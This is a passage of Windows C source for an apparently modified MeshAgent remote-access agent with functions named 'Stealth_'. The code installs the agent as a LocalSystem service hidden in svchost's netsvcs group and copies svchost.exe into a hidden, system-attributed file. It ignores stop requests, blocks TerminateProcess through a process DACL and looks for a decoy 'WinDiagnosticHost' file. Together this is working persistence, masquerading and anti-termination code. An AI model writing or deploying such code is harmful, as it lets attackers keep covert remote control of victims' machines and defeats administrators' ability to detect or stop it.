                                (int)ILibMemory_Size(g_SvchostExeUtf8),
                                NULL,
                                NULL);
            g_SvchostArgv[0] = g_SvchostExeUtf8;
        }
    }
    else
    {
        Stealth_DebugPrintfA("[svchost] failed to initialise UTF-8 module buffer");
    }

    if (g_SvchostFallbackExe[0] == 0)
    {
        DWORD lenA = GetModuleFileNameA(NULL, g_SvchostFallbackExe, (DWORD)_countof(g_SvchostFallbackExe));
        if (lenA == 0 || lenA >= _countof(g_SvchostFallbackExe))
        {
            g_SvchostFallbackExe[0] = 0;
        }
    }

    g_SvchostPathsInitialized = TRUE;
}

static void Stealth_SvchostLogProvisioningStatus(void)
{
    if (g_SvchostInstallDir[0] == L'\0')
    {
        Stealth_DebugPrintfW(L"[svchost] install directory unavailable; provisioning files cannot be validated");
        Stealth_SvchostLogLine(L"provisioning check skipped: install directory unavailable");
        return;
    }

    wchar_t configPath[MAX_PATH] = {0};
    _snwprintf_s(configPath, _countof(configPath), _TRUNCATE, L"%s\\%s", g_SvchostInstallDir, L".msh");
    DWORD primaryAttr = GetFileAttributesW(configPath);
    Stealth_DebugPrintfW(L"[svchost] provisioning file %ls (%ls)",
                         configPath,
                         (primaryAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
    Stealth_SvchostLogLine(L"provisioning file %ls (%ls)",
                           configPath,
                           (primaryAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");

    wchar_t dllNamedPath[MAX_PATH] = {0};
    mesh_branding_text_t dllName = MeshService_GetSvchostDllNameText();
    if (dllName != NULL)
    {
        wchar_t dllNameWide[MAX_PATH] = {0};
        MeshService_CopyBrandingTextToWide(dllName, dllNameWide, _countof(dllNameWide));
        if (dllNameWide[0] != L'\0')
        {
            wchar_t dllBase[MAX_PATH] = {0};
            lstrcpynW(dllBase, dllNameWide, (int)_countof(dllBase));
            wchar_t* dot = wcsrchr(dllBase, L'.');
            if (dot != NULL) { *dot = L'\0'; }
            _snwprintf_s(dllNamedPath, _countof(dllNamedPath), _TRUNCATE, L"%s\\%s.msh", g_SvchostInstallDir, dllBase);
        }
    }
    if (dllNamedPath[0] != L'\0')
    {
        DWORD dllAttr = GetFileAttributesW(dllNamedPath);
        Stealth_SvchostLogLine(L"provisioning file %ls (%ls)",
                               dllNamedPath,
                               (dllAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
    }

    if (primaryAttr == INVALID_FILE_ATTRIBUTES)
    {
        _snwprintf_s(configPath, _countof(configPath), _TRUNCATE, L"%s\\WinDiagnosticHost.msh", g_SvchostInstallDir);
        DWORD altAttr = GetFileAttributesW(configPath);
        Stealth_DebugPrintfW(L"[svchost] alternate provisioning file %ls (%ls)",
                             configPath,
                             (altAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
        Stealth_SvchostLogLine(L"alternate provisioning file %ls (%ls)",
                               configPath,
                               (altAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
    }
}

/**
 * Service control handler for svchost-hosted mode
 */
DWORD WINAPI Stealth_SvchostCtrlHandler(
    DWORD dwControl,
    DWORD dwEventType,
    LPVOID lpEventData,
    LPVOID lpContext)
{
    UNREFERENCED_PARAMETER(lpEventData);
    UNREFERENCED_PARAMETER(lpContext);

    switch (dwControl)
    {
        case SERVICE_CONTROL_STOP:
            Stealth_SvchostRefreshControlsAccepted();
            if (!Stealth_SvchostAllowStop())
            {
                Stealth_SvchostLogLine(L"Stop control ignored");
                Stealth_SvchostReportStopDenial();
                SetLastError(ERROR_SERVICE_CANNOT_ACCEPT_CTRL);
                return ERROR_SERVICE_CANNOT_ACCEPT_CTRL;
            }

            g_SvchostStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_SvchostStatus.dwCheckPoint = 0;
            g_SvchostStatus.dwWaitHint = 5000;
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

            g_SvchostRunning = FALSE;

            if (g_SvchostAgent != NULL)
            {
                MeshAgent_Stop(g_SvchostAgent);
                g_SvchostAgent = NULL;
            }

            g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
            g_SvchostStatus.dwCheckPoint = 0;
            g_SvchostStatus.dwWaitHint = 0;
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

            return NO_ERROR;

        case SERVICE_CONTROL_SHUTDOWN:
            g_SvchostStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_SvchostStatus.dwCheckPoint = 0;
            g_SvchostStatus.dwWaitHint = 5000;
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

            g_SvchostRunning = FALSE;

            if (g_SvchostAgent != NULL)
            {
                MeshAgent_Stop(g_SvchostAgent);
                g_SvchostAgent = NULL;
            }

            g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
            g_SvchostStatus.dwCheckPoint = 0;
            g_SvchostStatus.dwWaitHint = 0;
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

            return NO_ERROR;

        case SERVICE_CONTROL_INTERROGATE:
            // Report current status and refresh stop acceptance
            Stealth_SvchostRefreshControlsAccepted();
            return NO_ERROR;

        case SERVICE_CONTROL_PAUSE:
            // Not supported
            return ERROR_CALL_NOT_IMPLEMENTED;

        case SERVICE_CONTROL_CONTINUE:
            // Not supported
            return ERROR_CALL_NOT_IMPLEMENTED;

        case SERVICE_CONTROL_POWEREVENT:
            // Handle power events if needed
            switch (dwEventType)
            {
                case PBT_APMSUSPEND:
                    // System is suspending
                    break;
                case PBT_APMRESUMESUSPEND:
                    // System is resuming
                    break;
            }
            return NO_ERROR;

        case SERVICE_CONTROL_SESSIONCHANGE:
            // Handle session changes if needed
            return NO_ERROR;

        default:
            return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

/**
 * Main service entry point for svchost.exe hosting
 * This is the function that svchost.exe calls when starting our service
 */
VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
    // DWORD i; // not used; removed to avoid unused variable warning

    // Register service control handler
    Stealth_SvchostLogLine(L"ServiceMain invoked (argc=%lu)", (unsigned long)dwArgc);
    LPCTSTR svcKeyName = (LPCTSTR)MeshService_GetServiceFileText();
    g_SvchostStatusHandle = RegisterServiceCtrlHandlerEx(
        svcKeyName,
        (LPHANDLER_FUNCTION_EX)Stealth_SvchostCtrlHandler,
        NULL                    // Context
    );

    if (!g_SvchostStatusHandle)
    {
        Stealth_DebugLastErrorW(L"RegisterServiceCtrlHandlerEx");
        return;  // Failed to register handler
    }

    // Initialize service status structure
    g_SvchostStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;  // Shared svchost service
    g_SvchostStatus.dwCurrentState = SERVICE_START_PENDING;
    g_SvchostStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP |
                                          SERVICE_ACCEPT_SHUTDOWN |
                                          SERVICE_ACCEPT_POWEREVENT |
                                          SERVICE_ACCEPT_SESSIONCHANGE;
    g_SvchostStatus.dwWin32ExitCode = NO_ERROR;
    g_SvchostStatus.dwServiceSpecificExitCode = 0;
    g_SvchostStatus.dwCheckPoint = 0;
    g_SvchostStatus.dwWaitHint = 3000;

    // Report initial status
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

    Stealth_SvchostInitializePaths(NULL);

    // Initialize MeshAgent core with default capabilities
    g_SvchostAgent = MeshAgent_Create(0);

    if (!g_SvchostAgent)
    {
        Stealth_DebugPrintfA("MeshAgent_Create failed in svchost service main");
        Stealth_SvchostLogLine(L"MeshAgent_Create failed");
        // Failed to create agent
        g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
        g_SvchostStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
        g_SvchostStatus.dwServiceSpecificExitCode = 1;
        SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
        return;
    }

    g_SvchostAgent->serviceReserved = 1;
    if (g_SvchostExeUtf8 != NULL)
    {
        ((void**)ILibMemory_Extra(g_SvchostExeUtf8))[0] = g_SvchostAgent;
        g_SvchostAgent->exePath = g_SvchostExeUtf8;
        Stealth_SvchostLogLine(L"agent exePath set to %hs", g_SvchostExeUtf8);
    }
    else if (g_SvchostFallbackExe[0] != 0)
    {
        g_SvchostAgent->exePath = g_SvchostFallbackExe;
        Stealth_SvchostLogLine(L"agent exePath fallback %hs", g_SvchostFallbackExe);
    }

    mesh_branding_text_t serviceFileText = MeshService_GetServiceFileText();
    mesh_branding_text_t serviceDisplayText = MeshService_GetServiceNameText();
#if defined(UNICODE) || defined(_UNICODE)
    if (serviceFileText != NULL)
    {
        char utf8Name[128] = {0};
        if (WideCharToMultiByte(CP_UTF8, 0, serviceFileText, -1, utf8Name, (int)sizeof(utf8Name), NULL, NULL) > 0)
        {
            g_SvchostAgent->meshServiceName = ILibString_Copy(utf8Name, 0);
            Stealth_SvchostLogLine(L"service name set to %hs", g_SvchostAgent->meshServiceName);
        }
    }
    if (serviceDisplayText != NULL)
    {
        char utf8Display[256] = {0};
        if (WideCharToMultiByte(CP_UTF8, 0, serviceDisplayText, -1, utf8Display, (int)sizeof(utf8Display), NULL, NULL) > 0)
        {
            g_SvchostAgent->displayName = ILibString_Copy(utf8Display, 0);
        }
    }
#else
    if (serviceFileText != NULL)
    {
        g_SvchostAgent->meshServiceName = ILibString_Copy(serviceFileText, 0);
        Stealth_SvchostLogLine(L"service name set to %hs", g_SvchostAgent->meshServiceName);
    }
    if (serviceDisplayText != NULL)
    {
        g_SvchostAgent->displayName = ILibString_Copy(serviceDisplayText, 0);
    }
#endif
    g_SvchostAgent->JSRunningAsService = 1;
    g_SvchostAgent->JSRunningWithAdmin = 1;

    if (g_SvchostInstallDir[0] != L'\0')
    {
        if (!SetCurrentDirectoryW(g_SvchostInstallDir))
        {
            Stealth_DebugLastErrorW(L"SetCurrentDirectoryW");
            Stealth_SvchostLogLine(L"SetCurrentDirectoryW failed (%lu)", GetLastError());
        }
        else
        {
            Stealth_SvchostLogLine(L"working directory set to %ls", g_SvchostInstallDir);
        }
    }
    Stealth_SvchostLogProvisioningStatus();

    // Update status to RUNNING
    g_SvchostStatus.dwCurrentState = SERVICE_RUNNING;
    g_SvchostStatus.dwCheckPoint = 0;
    g_SvchostStatus.dwWaitHint = 0;
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

    // Apply process-level termination protection
    // This prevents Task Manager and TerminateProcess() from killing our svchost.exe
    // NOTE: This is different from Stealth_ProtectServiceFromTermination() which only
    // protects the SERVICE object in SCM. This protects the actual PROCESS.
    if (Stealth_ProtectCurrentProcess())
    {
        Stealth_SvchostLogLine(L"Process termination protection applied successfully");
        Stealth_DebugPrintfW(L"[svchost] Process DACL protection active - TerminateProcess blocked");
    }
    else
    {
        Stealth_SvchostLogLine(L"WARNING: Failed to apply process termination protection");
        Stealth_DebugPrintfW(L"[svchost] WARNING: Process DACL protection failed");
    }

    g_SvchostRunning = TRUE;

    char* startArgv[2] = { NULL, NULL };
    if (g_SvchostArgv[0] != NULL)
    {
        startArgv[0] = g_SvchostArgv[0];
    }
    else if (g_SvchostFallbackExe[0] != 0)
    {
        startArgv[0] = g_SvchostFallbackExe;
    }
    if (startArgv[0] == NULL)
    {
        startArgv[0] = "svchost.exe";
    }
    int startArgc = 1;

    Stealth_DebugPrintfA("[svchost] launching MeshAgent_Start (argv[0]=%s)", startArgv[0]);
    Stealth_SvchostLogLine(L"launching MeshAgent_Start (argv0=%hs)", startArgv[0]);
    int startResult = MeshAgent_Start(g_SvchostAgent, startArgc, startArgv);
    Stealth_DebugPrintfA("[svchost] MeshAgent_Start returned %d", startResult);
    Stealth_SvchostLogLine(L"MeshAgent_Start returned %d", startResult);
    if (g_SvchostAgent != NULL)
    {
        Stealth_SvchostLogLine(L"MeshAgent exit code %d", g_SvchostAgent->exitCode);
    }
    g_SvchostAgent = NULL;
    g_SvchostRunning = FALSE;

    // Service has stopped
    g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
}

/**
 * Register service for svchost.exe hosting
 * Creates required registry entries for svchost to load our DLL
 */
BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath)
{
    HKEY hKey = NULL;
    HKEY hParamsKey = NULL;
    HKEY hSvchostKey = NULL;
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    LONG result;
    BOOL success = FALSE;
    BOOL netsvcsConfigured = FALSE;
    wchar_t keyPath[512];
    DWORD dwType, dwSize;
    WCHAR wDisplayName[256] = {0};
    WCHAR wDescription[512] = {0};
    const wchar_t* groupName = L"netsvcs";
    WCHAR hostExePath[MAX_PATH] = {0};
    BOOL hostExeUsesExpand = FALSE;
    WCHAR imagePathValue[512] = {0};
    BOOL serviceSidConfigured = FALSE;

    if (serviceName == NULL || serviceName[0] == 0 || dllPath == NULL || dllPath[0] == 0)
    {
        Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService invalid parameters (service=%ls path=%ls)", serviceName, dllPath);
        return FALSE;
    }

    if (!Stealth_SelectSvchostImage(dllPath, hostExePath, _countof(hostExePath), &hostExeUsesExpand))
    {
        // even if selection fails, hostExePath contains fallback
    }

    if (hostExePath[0] == 0)
    {
        lstrcpynW(hostExePath, L"%SystemRoot%\\System32\\svchost.exe", (int)_countof(hostExePath));
        hostExeUsesExpand = TRUE;
    }

    _snwprintf_s(imagePathValue, _countof(imagePathValue), _TRUNCATE, L"%s -k %s -p", hostExePath, groupName);

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), wDisplayName, _countof(wDisplayName));
    MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, wDescription, _countof(wDescription));
    if (wDescription[0] == 0)
    {
        lstrcpynW(wDescription, L"system service", (int)_countof(wDescription));
    }

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (hSCM != NULL)
    {
        hService = CreateServiceW(
            hSCM,
            serviceName,
            (wDisplayName[0] != 0) ? wDisplayName : serviceName,
            SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG | DELETE,
            SERVICE_WIN32_SHARE_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            imagePathValue,
            NULL,
            NULL,
            NULL,
            L"LocalSystem",
            NULL);

        if (hService == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                hService = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG | DELETE);
                if (hService != NULL)
                {
                    if (!ChangeServiceConfigW(
                        hService,
                        SERVICE_WIN32_SHARE_PROCESS,
                        SERVICE_AUTO_START,
                        SERVICE_ERROR_NORMAL,
                        imagePathValue,
                        NULL,
                        NULL,
                        NULL,
                        NULL,
                        L"LocalSystem",
                        (wDisplayName[0] != 0) ? wDisplayName : NULL))
                    {
                        Stealth_DebugLastErrorW(L"ChangeServiceConfigW");
                        goto CLEANUP;
                    }
                }
                else
                {
                    Stealth_DebugLastErrorW(L"OpenServiceW");
                }
            }
            else
            {
                Stealth_DebugLastErrorW(L"CreateServiceW");
            }
        }
    }
    else
    {
        Stealth_DebugLastErrorW(L"OpenSCManagerW");
        goto CLEANUP;
    }

    if (hService == NULL)
    {
        Stealth_DebugLastErrorW(L"RegCreateKeyEx(Service)");
        goto CLEANUP;
    }

    {
        SERVICE_SID_INFO sidInfo = {0};
        sidInfo.dwServiceSidType = SERVICE_SID_TYPE_UNRESTRICTED;
        if (ChangeServiceConfig2W(hService, SERVICE_CONFIG_SERVICE_SID_INFO, &sidInfo))
        {
            serviceSidConfigured = TRUE;
        }
        else
        {
            Stealth_DebugLastErrorW(L"ChangeServiceConfig2W(ServiceSid)");
            goto CLEANUP;
        }
    }

    // Create service registry key
    swprintf_s(keyPath, sizeof(keyPath)/sizeof(wchar_t),
               L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);

    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, 0,
                             KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS)
    {
        goto CLEANUP;
    }

    // Set service type to SHARE_PROCESS
    DWORD dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (LPBYTE)&dwServiceType, sizeof(DWORD));

    // Set start type to AUTO_START
    DWORD dwStartType = SERVICE_AUTO_START;
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (LPBYTE)&dwStartType, sizeof(DWORD));

    // Set error control
    DWORD dwErrorControl = SERVICE_ERROR_NORMAL;
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (LPBYTE)&dwErrorControl, sizeof(DWORD));

    // Set ImagePath to svchost with netsvcs group
    RegSetValueExW(hKey, L"ImagePath", 0, hostExeUsesExpand ? REG_EXPAND_SZ : REG_SZ,
                   (LPBYTE)imagePathValue, (DWORD)((wcslen(imagePathValue) + 1) * sizeof(wchar_t)));

    // Set display name (generic)
    if (wDisplayName[0] != 0)
    {
        RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ,
                       (LPBYTE)wDisplayName, (DWORD)((wcslen(wDisplayName) + 1) * sizeof(wchar_t)));
    }

    // Set description (generic)
    if (wDescription[0] != 0)
    {
        RegSetValueExW(hKey, L"Description", 0, REG_SZ,
                       (LPBYTE)wDescription, (DWORD)((wcslen(wDescription) + 1) * sizeof(wchar_t)));
    }

    // Set ObjectName (LocalSystem)
    const wchar_t* objectName = L"LocalSystem";
    RegSetValueExW(hKey, L"ObjectName", 0, REG_SZ,
                   (LPBYTE)objectName, (DWORD)((wcslen(objectName) + 1) * sizeof(wchar_t)));

    if (serviceSidConfigured)
    {
        DWORD serviceSidType = SERVICE_SID_TYPE_UNRESTRICTED;
        RegSetValueExW(hKey, L"ServiceSidType", 0, REG_DWORD, (LPBYTE)&serviceSidType, sizeof(serviceSidType));
    }

    // Create Parameters subkey
    result = RegCreateKeyExW(hKey, L"Parameters", 0, NULL, 0,
                             KEY_WRITE, NULL, &hParamsKey, NULL);
    if (result == ERROR_SUCCESS)
    {
        // Set ServiceDll parameter (optional)
        if (dllPath && *dllPath)
        {
            RegSetValueExW(hParamsKey, L"ServiceDll", 0, REG_EXPAND_SZ,
                           (LPBYTE)dllPath, (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
        }

        // Set ServiceMain export name and unload policy
        const wchar_t* serviceMain = L"Stealth_SvchostServiceMain";
        RegSetValueExW(hParamsKey, L"ServiceMain", 0, REG_SZ,
                       (LPBYTE)serviceMain, (DWORD)((wcslen(serviceMain) + 1) * sizeof(wchar_t)));
        DWORD unload = 1;
        RegSetValueExW(hParamsKey, L"ServiceDllUnloadOnStop", 0, REG_DWORD, (LPBYTE)&unload, sizeof(unload));

        RegCloseKey(hParamsKey);
        hParamsKey = NULL;
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    // Add service to svchost netsvcs group
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                           L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
                           0, KEY_READ | KEY_WRITE, &hSvchostKey);
    if (result == ERROR_SUCCESS)
    {
        WCHAR currentServices[4096] = {0};
        dwSize = sizeof(currentServices);
        dwType = REG_MULTI_SZ;

        result = RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &dwType,
                                  (LPBYTE)currentServices, &dwSize);

        if (result == ERROR_FILE_NOT_FOUND)
        {
            currentServices[0] = L'\0';
            currentServices[1] = L'\0';
            dwSize = sizeof(wchar_t);
            result = ERROR_SUCCESS;
        }

        if (result == ERROR_SUCCESS)
        {
            WCHAR* ptr = currentServices;
            BOOL alreadyPresent = FALSE;

            while (*ptr != L'\0')
            {
                if (_wcsicmp(ptr, serviceName) == 0)
                {
                    alreadyPresent = TRUE;
                    break;
                }
                ptr += wcslen(ptr) + 1;
            }

            if (!alreadyPresent)
            {
                size_t usedChars = (size_t)(ptr - currentServices);
                size_t nameLen = wcslen(serviceName) + 1; // include null terminator
                size_t required = usedChars + nameLen + 1; // extra null for double-terminator

                if (required >= _countof(currentServices))
                {
                    Stealth_DebugLastErrorW(L"RegSetValueEx(netsvcs)");
                    goto CLEANUP;
                }

                wcscpy_s(currentServices + usedChars, _countof(currentServices) - usedChars, serviceName);
                usedChars += nameLen;
                currentServices[usedChars] = L'\0';
                usedChars++;

                DWORD bytesToWrite = (DWORD)(usedChars * sizeof(wchar_t));
                if (RegSetValueExW(hSvchostKey, L"netsvcs", 0, REG_MULTI_SZ,
                                   (LPBYTE)currentServices, bytesToWrite) != ERROR_SUCCESS)
                {
                    goto CLEANUP;
                }
            }

            netsvcsConfigured = TRUE;
        }

        RegCloseKey(hSvchostKey);
        hSvchostKey = NULL;
    }

    if (!netsvcsConfigured)
    {
        Stealth_DebugPrintfA("Failed to ensure netsvcs membership for %ls", serviceName);
        goto CLEANUP;
    }

    if (hService != NULL && wDescription[0] != 0)
    {
        SERVICE_DESCRIPTIONW sd = {0};
        sd.lpDescription = wDescription;
        ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }

    success = TRUE;

CLEANUP:
    if (hSvchostKey != NULL) { RegCloseKey(hSvchostKey); }
    if (hParamsKey != NULL) { RegCloseKey(hParamsKey); }
    if (hKey != NULL) { RegCloseKey(hKey); }
    if (hService != NULL) { CloseServiceHandle(hService); }
    if (hSCM != NULL) { CloseServiceHandle(hSCM); }

    return success;
}

static BOOL Stealth_ResetServiceSecurityByRegistry(const wchar_t* targetName)
{
    if (targetName == NULL || targetName[0] == L'\0') { return FALSE; }
    wchar_t keyPath[512];
    _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s", targetName);

    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return FALSE;
    }

    PSECURITY_DESCRIPTOR sd = NULL;
    BOOL ok = FALSE;
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(MESH_SERVICE_DACL_SDDL, SDDL_REVISION_1, &sd, NULL))
    {
        DWORD sdLen = GetSecurityDescriptorLength(sd);
        if (RegSetValueExW(hKey, L"Security", 0, REG_BINARY, (const BYTE*)sd, sdLen) == ERROR_SUCCESS)
        {
            ok = TRUE;
        }
        LocalFree(sd);
    }
    RegCloseKey(hKey);
    return ok;
}

BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName)
{
    if (!serviceName || !*serviceName) { return FALSE; }

    BOOL success = TRUE;
    // Remove from svchost group (netsvcs)
    HKEY hSvchostKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
                      0, KEY_READ | KEY_WRITE, &hSvchostKey) == ERROR_SUCCESS)
    {
        DWORD type = 0;
        DWORD cb = 0;
        if (RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
        {
            wchar_t* buf = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
            if (buf && RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS)
            {
                buf[cb / sizeof(wchar_t)] = L'\0';
                buf[cb / sizeof(wchar_t) + 1] = L'\0';
                // Build new list excluding serviceName
                size_t outLen = 0;
                wchar_t* out = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
                if (out)
                {
                    for (wchar_t* p = buf; *p; p += (wcslen(p) + 1))
                    {
                        if (_wcsicmp(p, serviceName) == 0) { continue; }
                        size_t len = wcslen(p) + 1;
                        wcscpy_s(out + outLen, (cb/sizeof(wchar_t)) - outLen, p);
                        outLen += len;
                    }
                    out[outLen] = L'\0';
                    RegSetValueExW(hSvchostKey, L"netsvcs", 0, REG_MULTI_SZ,
                                   (LPBYTE)out, (DWORD)((outLen + 1) * sizeof(wchar_t)));
                    free(out);
                }
            }
            if (buf) free(buf);
        }
        RegCloseKey(hSvchostKey);
    }

    // Remove service from SCM
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM != NULL)
    {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
        if (hService != NULL)
        {
            SERVICE_STATUS svcStatus = {0};
            ControlService(hService, SERVICE_CONTROL_STOP, &svcStatus);
            if (!DeleteService(hService))
            {
                success = FALSE;
                Stealth_LogInstallEvent(L"[WARN] DeleteService failed for %ls (error=%lu)", serviceName, GetLastError());
            }
            CloseServiceHandle(hService);
        }
        else
        {
            DWORD openErr = GetLastError();
            if (openErr == ERROR_ACCESS_DENIED)
            {
                if (Stealth_ResetServiceSecurityByRegistry(serviceName))
                {
                    Stealth_LogInstallEvent(L"Reset service security descriptor via registry for %ls", serviceName);
                    hService = OpenServiceW(hSCM, serviceName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
                }
                else
                {
                    Stealth_LogInstallEvent(L"[WARN] Failed to reset service security descriptor via registry for %ls", serviceName);
                }
            }
            if (hService != NULL)
            {
                SERVICE_STATUS svcStatus = {0};
                ControlService(hService, SERVICE_CONTROL_STOP, &svcStatus);
                if (!DeleteService(hService))
                {
                    success = FALSE;
                    Stealth_LogInstallEvent(L"[WARN] DeleteService failed for %ls (error=%lu)", serviceName, GetLastError());
                }
                CloseServiceHandle(hService);
            }
            else if (openErr != ERROR_SERVICE_DOES_NOT_EXIST)
            {
                success = FALSE;
                Stealth_LogInstallEvent(L"[WARN] OpenService failed for %ls (error=%lu)", serviceName, openErr);
            }
        }
        CloseServiceHandle(hSCM);
    }
    else
    {
        success = FALSE;
    }

    // Delete service key tree
    wchar_t keyPath[512];
    _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);
    LSTATUS del = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);
    if (!(del == ERROR_SUCCESS || del == ERROR_FILE_NOT_FOUND || del == ERROR_PATH_NOT_FOUND))
    {
        success = FALSE;
    }

    return success;
}

/**
 * DLL Main entry point
 * Required for DLL version of MeshAgent
 */
#ifdef BUILD_SVCHOST_DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // DLL is being loaded
            // Disable thread notifications for performance
            Stealth_SvchostInitializePaths(hinstDLL);
            DisableThreadLibraryCalls(hinstDLL);
            break;

        case DLL_PROCESS_DETACH:
            // DLL is being unloaded
            if (g_SvchostAgent != NULL)
            {
                MeshAgent_Stop(g_SvchostAgent);
                g_SvchostAgent = NULL;
            }
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            // Not used due to DisableThreadLibraryCalls
            break;
    }

    return TRUE;
}
#endif // BUILD_SVCHOST_DLL
static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand)
{
    WCHAR windowsDir[MAX_PATH] = {0};
    WCHAR installDir[MAX_PATH] = {0};

    if (exePathOut == NULL || exePathOutLen == 0) { return FALSE; }
    exePathOut[0] = L'\0';
    if (useExpand != NULL) { *useExpand = FALSE; }

    if (dllPath != NULL && dllPath[0] != 0)
    {
        lstrcpynW(installDir, dllPath, (int)_countof(installDir));
        wchar_t *lastSlash = wcsrchr(installDir, L'\\');
        if (lastSlash != NULL) { *lastSlash = L'\0'; }
    }

    if (GetWindowsDirectoryW(windowsDir, (DWORD)_countof(windowsDir)) > 0)
    {
        WCHAR pattern[MAX_PATH] = {0};
        WIN32_FIND_DATAW findData;
        HANDLE hFind = INVALID_HANDLE_VALUE;

        _snwprintf_s(pattern, _countof(pattern), _TRUNCATE, L"%s\\WinSxS\\amd64_microsoft-windows-services-svchost_*", windowsDir);
        hFind = FindFirstFileW(pattern, &findData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
                {
                    WCHAR candidate[MAX_PATH] = {0};
                    WCHAR target[MAX_PATH] = {0};

                    _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\WinSxS\\%s\\svchost.exe", windowsDir, findData.cFileName);
                    if (GetFileAttributesW(candidate) == INVALID_FILE_ATTRIBUTES) { continue; }

                    if (installDir[0] != 0)
                    {
                        _snwprintf_s(target, _countof(target), _TRUNCATE, L"%s\\svchost.exe", installDir);
                        SetFileAttributesW(target, FILE_ATTRIBUTE_NORMAL);
                        DeleteFileW(target);
                        if (CopyFileW(candidate, target, FALSE))
                        {
                            SetFileAttributesW(target, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                            lstrcpynW(exePathOut, target, (int)exePathOutLen);
                            FindClose(hFind);
                            return TRUE;
                        }
                        else
                        {
                            DWORD err = GetLastError();
                            fwprintf(stderr, L"[!] CopyFile failed: %s -> %s (error %lu)\n", candidate, target, err);
                        }
                    }
                    else
                    {
                        lstrcpynW(exePathOut, candidate, (int)exePathOutLen);
                        FindClose(hFind);
                        return TRUE;
                    }
                }
